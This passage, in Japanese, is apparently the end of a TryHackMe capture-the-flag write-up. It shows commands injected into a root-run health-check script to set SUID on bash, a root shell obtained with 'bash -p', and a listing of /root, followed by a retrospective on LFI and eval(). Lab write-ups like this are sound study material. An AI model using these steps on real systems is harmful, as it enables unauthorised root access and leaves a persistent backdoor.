echo "cp /bin/bash /tmp/bash" >> "$LOG_FILE"
cp /bin/bash /tmp/bash
chmod +s /tmp/bash

echo "[$TIMESTAMP] Health check started" >> "$LOG_FILE"
systemctl is-active --quiet apache2 && echo "[$TIMESTAMP] Apache: OK" >> "$LOG_FILE" || echo "[$TIMESTAMP] Apache: DOWN" >> "$LOG_FILE"
systemctl is-active --quiet mysql && echo "[$TIMESTAMP] MySQL: OK" >> "$LOG_FILE" || echo "[$TIMESTAMP] MySQL: DOWN" >> "$LOG_FILE"
DISK=$(df -h / | awk "NR==2{print \$5}")
echo "[$TIMESTAMP] Disk: $DISK" >> "$LOG_FILE"
```

実行はされているが、なぜか /tmp/bash が作られない。

```sh
devops@tryhackme-2404:~$ tail /var/log/nexus_health.log
[2026-07-07 08:20:01] Disk: 7%
[2026-07-07 08:21:01] Health check started
[2026-07-07 08:21:01] Apache: OK
[2026-07-07 08:21:01] MySQL: OK
[2026-07-07 08:21:01] Disk: 7%
cp /bin/bash /tmp/bash
[2026-07-07 08:22:01] Health check started
[2026-07-07 08:22:01] Apache: OK
[2026-07-07 08:22:01] MySQL: OK
[2026-07-07 08:22:01] Disk: 7%
```

ダイレクトに /bin/bash に SUIDを付けたら成功した。

```sh
devops@tryhackme-2404:~$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

昇格成功！

```sh
devops@tryhackme-2404:~$ /bin/bash -p
bash-5.2# id
uid=1001(devops) gid=1001(devops) euid=0(root) egid=0(root) groups=0(root),1001(devops)
bash-5.2# ls -al /root
total 36
drwx------  5 root root 4096 Apr 29 11:00 .
drwxr-xr-x 22 root root 4096 Jul  7 07:58 ..
-rw-------  1 root root    5 Feb 17 18:58 .bash_history
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwxr-xr-x  3 root root 4096 Oct 22  2024 .local
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
drwx------  2 root root 4096 Oct 22  2024 .ssh
-rw-------  1 root root   29 Apr 29 11:00 root.txt
drwxr-xr-x  4 root root 4096 Oct 22  2024 snap
```

## 振り返り

- 苦労して4時間かかったが、ノーヒントでクリア成功。
- LFI が成功したらすべてのソースコードを取得してきちんと確認するのが大事と痛感。files.php を最初に読んだとき、パストラバーサルが封じられていることだけ着目して、eval()が実装されていることを見落としていた。
- /tmp/bash にコピーされなかった原因は、systemd から見た /tmp は、ユーザーから見えている /tmp と隔離された別の空間になる場合があるとのことで、それが原因だったと思われる。


## Tags

#tags:LFI #tags:RFI
